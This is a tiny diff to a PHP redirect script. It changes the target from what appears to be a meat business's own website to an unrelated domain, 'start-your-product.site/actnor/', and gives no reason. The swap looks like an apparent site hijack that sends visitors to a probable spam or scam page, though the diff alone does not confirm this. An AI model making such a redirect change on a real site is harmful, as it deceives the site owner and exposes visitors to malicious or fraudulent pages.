@@ -1,4 +1,4 @@
 <?php
-header("Location: http://www.publicanqualitymeats.com/");
+header("Location: https://start-your-product.site/actnor/");
 die();
 ?>
